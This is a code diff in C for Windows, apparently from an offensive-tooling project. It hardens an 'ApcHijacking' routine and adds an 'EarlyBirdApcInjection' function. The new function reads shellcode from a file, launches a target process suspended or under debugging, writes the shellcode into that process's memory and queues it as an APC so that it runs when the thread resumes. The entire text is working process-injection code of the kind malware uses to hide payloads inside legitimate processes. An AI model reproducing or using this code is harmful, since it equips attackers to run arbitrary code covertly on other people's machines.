@@ -136,7 +136,8 @@ BOOL ApcHijacking(IN LPCSTR lpProcessName, IN LPCSTR lpShellcodePath)
 			if (Thr.th32OwnerProcessID == dwProcessId)
 			{
 				if ((hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, Thr.th32ThreadID)) != NULL)
-					QueueUserAPC((PAPCFUNC)apcRoutine, hThread, NULL);
+					if (!QueueUserAPC((PAPCFUNC)apcRoutine, hThread, NULL))
+						return ReportErrorWinAPI("QueueUserAPC");
 				NumberOfThreads++;
 				Sleep(2000);
 			}
@@ -144,9 +145,52 @@ BOOL ApcHijacking(IN LPCSTR lpProcessName, IN LPCSTR lpShellcodePath)
 	}
 	printf("[i] Queued %d threads\n", NumberOfThreads);
 
+	LocalFree(pShellcode);
 	CloseHandle(hSnapshot);
 	FreeMemory(hProcess, pShellcodeAddr);
 	CloseHandle(hThread);
+
+	return TRUE;
+}
+
+BOOL EarlyBirdApcInjection(IN DWORD dwCreationFlag, IN LPCSTR lpProcessName, IN LPCSTR lpShellcodePath)
+{
+	HANDLE hProcess, hThread;
+	DWORD dwProcessId;
+	PVOID pShellcode, pShellcodeAddr;
+	SIZE_T sShellcodeSize;
+
+	if (!FetchShellcode(lpShellcodePath, &pShellcode, &sShellcodeSize))
+		return FALSE;
+
+	if (!RunProcess(dwCreationFlag, lpProcessName, &hProcess, &hThread, &dwProcessId))
+		return FALSE;
+
+	if (!AllocateMemory(hProcess, pShellcode, sShellcodeSize, &pShellcodeAddr))
+		return FALSE;
+
+	if (!QueueUserAPC((PAPCFUNC)pShellcodeAddr, hThread, NULL))
+		return ReportErrorWinAPI("QueueUserAPC");
+
+	if (dwCreationFlag == CREATE_SUSPENDED)
+	{
+		printf("[i] Resuming the process\n");
+		ResumeThread(hThread);
+	}
+	else if (dwCreationFlag == DEBUG_PROCESS)
+	{
+		printf("[i] Detaching from the process\n");
+		DebugActiveProcessStop(dwProcessId);
+	}
+	else
+		return FALSE;
+
+	if (!WaitForThread(hThread))
+		return FALSE;
+
+	LocalFree(pShellcode);
+	CloseHandle(hThread);
+	FreeMemory(hProcess, pShellcodeAddr);
 
 	return TRUE;
 }
